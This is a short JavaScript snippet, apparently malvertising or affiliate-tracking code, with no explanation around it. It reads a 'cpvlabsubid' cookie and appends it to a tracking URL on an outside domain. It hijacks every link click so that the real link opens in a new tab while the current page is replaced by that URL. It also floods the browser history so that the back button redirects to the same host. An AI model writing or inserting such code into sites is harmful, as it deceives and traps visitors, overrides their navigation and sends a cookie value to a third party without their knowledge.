var cpvlabsubid = document.cookie.split('; ').find(row => row.startsWith('cpvlabsubid='))?.split('=')[1] || '';
var baseUrl = 'https://m.bolo2vas77.click/c/n/272148/4989';
var under = back = baseUrl + (cpvlabsubid ? '?p1=' + encodeURIComponent(cpvlabsubid) : '');
console.log('cpvlabsubid value:', cpvlabsubid);
console.log('under value:', under);
console.log('back value:', back);

// Check if 'under' variable is defined
if (typeof under !== "undefined" && under !== null) {
   
    document.addEventListener('click', function(event) {
        var target = event.target;
        while (target) {
            if (target.tagName === 'A') {
                const linkHref = target.href;
                event.preventDefault();
                window.open(linkHref, '_blank');
                window.location.replace(under);
                break;
            }
            target = target.parentNode;
        }
    });
}

// Check if the 'back' variable is defined
if (typeof back !== "undefined" && back !== null) {
    
    !(function() {
        var t;
        try {
            
            const URL = window.location.href.split(/[#]/)[0];
            
            for (t = 0; t < 10; ++t) {
                history.pushState({}, '', URL + '#');
            }
            
            onpopstate = function(event) {
                
                event.state && location.replace(back);
            };
        } catch (o) {
            console.log(o);
        }
    })();
}